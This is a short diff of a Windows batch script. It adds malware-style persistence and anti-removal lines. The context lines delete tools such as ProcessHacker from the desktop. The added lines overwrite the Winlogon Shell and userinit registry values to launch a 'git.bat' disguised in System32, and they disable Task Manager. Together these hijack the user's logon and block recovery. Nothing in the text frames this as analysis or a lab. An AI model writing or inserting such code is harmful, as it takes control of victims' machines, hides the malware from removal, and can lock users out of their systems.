@@ -54,6 +54,11 @@ del C:\Users\%username%\desktop\Uninstall tool.exe /s /q
 del C:\Users\%username%\desktop\ProcessHacker.exe /s /q
 
 @echo off
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\Windows\System32\git.bat" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /t REG_SZ /d "C:\Windows\system32\git.bat" /f
+REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+
+@echo off
 
 setlocal
 
